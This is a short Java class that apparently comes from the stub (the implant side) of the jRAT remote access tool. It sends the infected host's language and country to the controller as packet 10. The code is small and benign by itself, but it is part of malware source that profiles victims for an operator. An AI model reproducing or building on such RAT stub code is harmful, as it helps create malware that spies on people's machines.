package se.jrat.stub.packets.outgoing;

import java.io.DataOutputStream;
import java.util.Locale;

import se.jrat.common.io.StringWriter;


public class Packet10InitDefaultLocale extends AbstractOutgoingPacket {

	private Locale locale;

	public Packet10InitDefaultLocale(Locale locale) {
		this.locale = locale;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(locale.getDisplayLanguage());
		sw.writeLine(locale.getLanguage());
		sw.writeLine(locale.getCountry());
	}

	@Override
	public byte getPacketId() {
		return (byte) 10;
	}
}